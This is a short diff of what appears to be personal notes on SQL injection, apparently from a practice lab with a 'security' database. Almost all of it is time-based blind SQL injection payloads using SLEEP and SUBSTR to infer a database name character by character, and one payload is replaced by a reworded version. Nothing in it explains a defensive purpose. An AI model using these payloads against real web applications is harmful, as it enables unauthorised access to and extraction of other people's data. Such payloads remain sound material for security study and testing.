@@ -2,4 +2,4 @@ id=1' AND ASCII(SUBSTR(DATABASE(),1,1)) > 97 AND sleep(20);--
 
 another one 
 
- AND if ((select database()="security"),sleep(10),NULL);
+id = 1'IF ((SELECT DATABASE() = "security"), SLEEP(10), NULL);
